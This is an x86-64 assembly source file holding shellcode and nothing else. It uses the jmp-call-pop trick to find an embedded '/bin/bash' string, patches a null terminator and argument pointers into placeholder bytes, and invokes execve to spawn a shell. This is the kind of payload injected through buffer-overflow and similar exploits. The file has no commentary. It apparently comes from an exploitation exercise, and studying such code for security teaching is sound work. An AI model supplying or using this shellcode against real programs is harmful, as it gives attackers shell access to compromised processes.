.text
.global _start
_start:
    jmp statement

    shell:
        pop %rbx
        xor %rax,%rax
        movb %al,0x9(%rbx)
        mov %rbx,0xa(%rbx)
        mov %rax,0x12(%rbx)
        mov $59,%rax
        mov %rbx,%rdi
        lea 0xa(%rbx),%rsi
        lea 0x12(%rbx),%rdx
        syscall

    statement:
    call shell
    variables:
        .ascii "/bin/bashABBBBBBBBCCCCCCCC"
